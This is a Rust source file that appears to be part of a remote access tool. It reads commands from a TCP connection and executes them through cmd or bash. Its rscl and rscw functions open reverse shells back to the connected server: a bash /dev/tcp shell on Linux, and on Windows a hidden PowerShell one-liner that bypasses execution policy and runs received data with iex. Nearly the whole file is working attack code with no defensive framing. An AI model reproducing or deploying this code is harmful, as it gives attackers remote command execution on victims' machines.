use std::io::{BufRead, BufReader, Error, ErrorKind};
use std::net::TcpStream;
use std::process::{Command, ExitStatus};
use std::str::from_utf8;

pub fn reader(stream: &TcpStream) -> Result<String, Error> {
    let mut msg: BufReader<&TcpStream> = BufReader::new(&stream);
    let mut buffer: Vec<u8> = Vec::new();
    msg.read_until(b'\n', &mut buffer)?;
    let output: &str = match from_utf8(&buffer) {
        Ok(it) => it,
        Err(err) => {
            return Err(Error::new(
                ErrorKind::InvalidData,
                format!("Buffer invalid: {}", err),
            ))
        }
    };
    Ok(output.to_string())
}

fn run_command(command: String) -> Result<ExitStatus, Error> {
    if cfg!(target_os = "windows") {
        return Command::new("cmd").arg("/C").arg(command).status();
    } else if cfg!(target_os = "linux") {
        return Command::new("bash").arg("-c").arg(command).status();
    }
    Err(Error::new(ErrorKind::Unsupported, "No supported OS"))
}

fn get_server_ip(stream: &TcpStream) -> Result<String, Error> {
    match stream.peer_addr()? {
        std::net::SocketAddr::V4(addr) => {
            return Ok(addr.ip().to_string());
        }
        std::net::SocketAddr::V6(_) => {
            return Err(Error::new(ErrorKind::Unsupported, "IPv6 not supported"));
        }
    }
}

fn rscl(stream: &TcpStream, port: u16) -> Result<ExitStatus, Error> {
    let ip: String = get_server_ip(stream)?;
    let reverseshell: String = format!("bash -i >& /dev/tcp/{ip}/{port} 0>&1"); //"bash -c 'bash -i >& /dev/tcp/0.0.0.0/23234 0>&1'";
    run_command(reverseshell)
}
fn rscw(stream: &TcpStream, port: u16) -> Result<ExitStatus, Error> {
    let ip: String = get_server_ip(stream)?;
    let reverseshell: String = format!("powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()");
    run_command(reverseshell)
}

pub fn rsc(stream: &TcpStream, port: u16) -> Result<ExitStatus, Error> {
    if cfg!(target_os = "windows") {
        rscw(&stream, port)
    } else if cfg!(target_os = "linux") {
        rscl(&stream, port)
    } else {
        Err(Error::new(ErrorKind::Unsupported, "No supported OS"))
    }
}
